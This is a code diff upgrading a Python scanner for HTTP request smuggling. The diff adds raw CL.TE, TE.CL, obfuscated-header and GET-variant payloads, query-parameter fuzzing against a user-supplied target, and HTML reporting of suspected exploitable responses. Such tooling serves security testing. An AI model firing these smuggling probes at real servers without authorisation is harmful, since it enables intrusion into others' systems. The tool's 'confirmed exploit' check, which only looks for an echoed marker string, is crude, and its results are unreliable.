@@ -1,87 +1,65 @@
 #!/usr/bin/python
 import argparse
 import socket
-from urllib.parse import urlparse
+from urllib.parse import urlparse, parse_qs, urlencode
 import ssl
 import json
 import os
 from datetime import datetime
 
-# Professional-grade 0.CL Request Smuggling Scanner by nu11secur1ty 2025 (educational use only)
-# Features:
-# - Multiple payloads (CL.TE, TE.CL, obfuscated, extra CRLF, spacing variations)
-# - Baseline comparison
-# - Response timing measurement
-# - Console color-coded output
-# - HTML report generation with full POST requests and descriptions
-# - Automatic flagging of likely and confirmed exploitable payloads
-
-TEST_PAYLOADS = [
-    ("CL-only baseline",
-     "POST / HTTP/1.1\r\n"
-     "Host: {host}\r\n"
-     "Content-Length: 11\r\n"
-     "Connection: close\r\n"
-     "\r\n"
-     "HELLO_WORLD",
-     "Baseline request with only Content-Length"),
-
-    ("CL.TE",
-     "POST / HTTP/1.1\r\n"
-     "Host: {host}\r\n"
-     "Content-Length: 6\r\n"
-     "Transfer-Encoding: chunked\r\n"
-     "Connection: close\r\n"
-     "\r\n"
-     "0\r\n\r\nSMUGGL\r\n",
-     "Conflicting Content-Length and Transfer-Encoding (CL.TE)"),
-
-    ("TE.CL",
-     "POST / HTTP/1.1\r\n"
-     "Host: {host}\r\n"
-     "Transfer-Encoding: chunked\r\n"
-     "Content-Length: 6\r\n"
-     "Connection: close\r\n"
-     "\r\n"
-     "0\r\n\r\nSMUGGL\r\n",
-     "Conflicting Transfer-Encoding then Content-Length (TE.CL)"),
-
-    ("TE.CL (obfuscated)",
-     "POST / HTTP/1.1\r\n"
-     "Host: {host}\r\n"
-     "Transfer-Encoding: chunked\r\n"
-     "Content-Length: 6\r\n"
-     "Connection: close\r\n"
-     "\r\n"
-     "0 ;\r\n\r\nSMUGGL\r\n",
-     "TE.CL with obfuscated chunk size"),
-
-    ("CL.TE (extra CRLF)",
-     "POST / HTTP/1.1\r\n"
-     "Host: {host}\r\n"
-     "Content-Length: 6\r\n"
-     "Transfer-Encoding: chunked\r\n"
-     "Connection: close\r\n"
-     "\r\n\r\n"
-     "0\r\n\r\nSMUGGL\r\n",
-     "CL.TE variant with extra CRLF"),
-
-    ("CL.TE (tab spacings)",
-     "POST / HTTP/1.1\r\n"
-     "Host:\t{host}\r\n"
-     "Content-Length:\t6\r\n"
-     "Transfer-Encoding:\tchunked\r\n"
-     "Connection: close\r\n"
-     "\r\n"
-     "0\r\n\r\nSMUGGL\r\n",
-     "CL.TE variant with tab spacings"),
-]
+# 0.CL Request Smuggling Scanner by nu11secur1ty 2025
+# Fully upgraded with POST/GET, URL parameter fuzzing, and reporting
 
 RED = '\033[91m'
 ORANGE = '\033[33m'
 GREEN = '\033[92m'
 RESET = '\033[0m'
 
+# Base POST payloads
+TEST_PAYLOADS = [
+    ("CL-only baseline",
+     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 11\r\nConnection: close\r\n\r\nHELLO_WORLD",
+     "Baseline request with only Content-Length"),
+    ("CL.TE",
+     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
+     "Conflicting Content-Length and Transfer-Encoding (CL.TE)"),
+    ("TE.CL",
+     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\nConnection: close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
+     "Conflicting Transfer-Encoding then Content-Length (TE.CL)"),
+    ("TE.CL (obfuscated)",
+     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\nConnection: close\r\n\r\n0 ;\r\n\r\nSMUGGL\r\n",
+     "TE.CL with obfuscated chunk size"),
+    ("CL.TE (extra CRLF)",
+     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n\r\n0\r\n\r\nSMUGGL\r\n",
+     "CL.TE variant with extra CRLF"),
+    ("CL.TE (tab spacings)",
+     "POST /{path} HTTP/1.1\r\nHost:\t{host}\r\nContent-Length:\t6\r\nTransfer-Encoding:\tchunked\r\nConnection: close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
+     "CL.TE variant with tab spacings"),
+]
+
+# Additional POST/GET techniques
+EXTRA_PAYLOADS = [
+    ("GET baseline",
+     "GET /{path} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n",
+     "Baseline GET request"),
+    ("GET TE",
+     "GET /{path} HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
+     "GET with chunked encoding to test smuggling"),
+    ("POST CL.TE (case mix)",
+     "POST /{path} HTTP/1.1\r\nhOsT: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: Chunked\r\nConnection: Close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
+     "POST CL.TE with mixed case headers"),
+    ("POST CL.TE (extra CRLFs)",
+     "POST /{path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n\r\n\r\n0\r\n\r\nSMUGGL\r\n",
+     "POST CL.TE with multiple CRLFs"),
+    ("POST CL.TE (spaced headers)",
+     "POST /{path} HTTP/1.1\r\nHost : {host}\r\nContent-Length : 6\r\nTransfer-Encoding : chunked\r\nConnection : close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
+     "POST CL.TE with spaces before colon"),
+    ("GET CL.TE conflict",
+     "GET /{path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\nSMUGGL\r\n",
+     "GET request with CL/TE conflict"),
+]
+
+TEST_PAYLOADS.extend(EXTRA_PAYLOADS)
 
 def send_raw_request(host, port, raw_request, use_tls=False):
     import time
@@ -104,7 +82,6 @@ def send_raw_request(host, port, raw_request, use_tls=False):
     except Exception as e:
         return f"Error: {e}", None
 
-
 def generate_html_report(results, output_file):
     html_content = f"""
 <html>
@@ -125,9 +102,8 @@ pre {{ white-space: pre-wrap; word-wrap: break-word; }}
 <h2>0.CL Request Smuggling Scan Report</h2>
 <p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
 <table>
-<tr><th>Payload Name</th><th>Description</th><th>POST Request</th><th>Response Line</th><th>Status</th><th>Response Time (s)</th></tr>
+<tr><th>Payload Name</th><th>Description</th><th>Request</th><th>Response Line</th><th>Status</th><th>Response Time (s)</th><th>Target</th></tr>
 """
-
     for r in results:
         if r.get('confirmed_exploit', False):
             status_class = 'confirmed'
@@ -139,47 +115,66 @@ pre {{ white-space: pre-wrap; word-wrap: break-word; }}
             status_class = 'normal'
             status_text = 'Normal'
         response_time = f"{r['response_time']:.3f}" if r.get('response_time') else "N/A"
-        html_content += f"<tr><td>{r['payload']}</td><td>{r['description']}</td><td><pre>{r['request']}</pre></td><td>{r['response_line']}</td><td class='{status_class}'>{status_text}</td><td>{response_time}</td></tr>\n"
+        target_info = r.get('target', '')
+        html_content += f"<tr><td>{r['payload']}</td><td>{r['description']}</td><td><pre>{r['request']}</pre></td><td>{r['response_line']}</td><td class='{status_class}'>{status_text}</td><td>{response_time}</td><td>{target_info}</td></tr>\n"
 
     html_content += "</table>\n</body>\n</html>"
-
     with open(output_file, 'w', encoding='utf-8') as f:
         f.write(html_content)
     print(f"\n✅ HTML report generated at {output_file}")
 
+def check_smuggling(host, port, scheme, path='/', query=None, output_json=False):
+    import itertools
 
-def check_smuggling(host, port, scheme, output_json=False):
-    print(f"[*] Starting scan for {scheme}://{host}:{port}...\n")
+    print(f"[*] Starting scan for {scheme}://{host}:{port}{path}...\n")
     results = []
     baseline_status = None
 
-    for name, payload, description in TEST_PAYLOADS:
-        raw_request = payload.format(host=host)
-        response, resp_time = send_raw_request(host, port, raw_request, use_tls=(scheme == 'https'))
-        first_line = response.split('\r\n')[0] if response else '(no response)'
-        suspicious = ('400' in first_line or '403' in first_line)
-        confirmed = 'SMUGGL' in response
+    # Prepare fuzzing for query parameters
+    if query:
+        param_names = list(query.keys())
+        fuzz_values = ["1", "test", "!@#", "SMUGGL"]
+        fuzz_combinations = []
+        for param in param_names:
+            for val in fuzz_values:
+                fuzz_combinations.append({param: val})
+    else:
+        fuzz_combinations = [None]
 
-        color = RED if confirmed else ORANGE if suspicious else GREEN
-        print(f"--- Payload: {name} ---")
-        print(f"{color}Response: {first_line} (time: {resp_time:.3f}s){RESET}")
+    for fuzz in fuzz_combinations:
+        query_str = f"?{urlencode(fuzz)}" if fuzz else ''
+        full_path = f"{path}{query_str}"
 
-        results.append({
-            'payload': name,
-            'description': description,
-            'request': raw_request,
-            'response_line': first_line,
-            'suspicious': suspicious,
-            'confirmed_exploit': confirmed,
-            'likely_exploit': suspicious and not confirmed,
-            'response_time': resp_time
-        })
+        for name, payload, description in TEST_PAYLOADS:
+            raw_request = payload.format(host=host, path=full_path)
+            response, resp_time = send_raw_request(host, port, raw_request, use_tls=(scheme == 'https'))
+            first_line = response.split('\r\n')[0] if response else '(no response)'
+            suspicious = '400' in first_line or '403' in first_line
+            confirmed = 'SMUGGL' in response
 
-        if name == 'CL-only baseline':
-            baseline_status = first_line
+            color = RED if confirmed else ORANGE if suspicious else GREEN
+            target_info = f"{full_path}" if fuzz else path
+            print(f"--- Payload: {name} | Target: {target_info} ---")
+            print(f"{color}Response: {first_line} (time: {resp_time:.3f}s){RESET}")
 
+            results.append({
+                'payload': name,
+                'description': description,
+                'request': raw_request,
+                'response_line': first_line,
+                'suspicious': suspicious,
+                'confirmed_exploit': confirmed,
+                'likely_exploit': suspicious and not confirmed,
+                'response_time': resp_time,
+                'target': target_info
+            })
+
+            if name == 'CL-only baseline' and not fuzz:
+                baseline_status = first_line
+
+    # Baseline vs smuggling comparison
     print('\n--- Baseline vs Smuggling Comparison ---')
-    for r in results[1:]:
+    for r in results:
         if baseline_status and r['response_line'] != baseline_status and not r.get('confirmed_exploit', False):
             r['likely_exploit'] = True
             print(f"{ORANGE}⚠️ {r['payload']} likely exploitable ({baseline_status} -> {r['response_line']}){RESET}")
@@ -188,23 +183,22 @@ def check_smuggling(host, port, scheme, output_json=False):
         else:
             print(f"{GREEN}{r['payload']} response matches baseline{RESET}")
 
-    script_dir = os.path.dirname(os.path.realpath(__file__))
-    report_file = os.path.join(script_dir, '0cl_scan_report.html')
+    report_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), '0cl_scan_report.html')
     generate_html_report(results, report_file)
 
     if output_json:
         print('\n--- JSON Report ---')
         print(json.dumps(results, indent=2))
 
-
 def parse_target(target_url, port=None):
     parsed = urlparse(target_url)
     scheme = parsed.scheme if parsed.scheme else 'http'
     host = parsed.netloc if parsed.netloc else parsed.path
+    path = parsed.path if parsed.path else '/'
+    query = parse_qs(parsed.query) if parsed.query else None
     if not port:
         port = 443 if scheme == 'https' else 80
-    return host, port, scheme
-
+    return host, port, scheme, path, query
 
 def main():
     parser = argparse.ArgumentParser(description='Professional 0.CL Request Smuggling Scanner')
@@ -213,10 +207,8 @@ def main():
     parser.add_argument('--json', action='store_true', help='Output results in JSON format')
     args = parser.parse_args()
 
-    host, port, scheme = parse_target(args.target, args.port)
-    check_smuggling(host, port, scheme, output_json=args.json)
-
+    host, port, scheme, path, query = parse_target(args.target, args.port)
+    check_smuggling(host, port, scheme, path, query=query, output_json=args.json)
 
 if __name__ == '__main__':
     main()
-
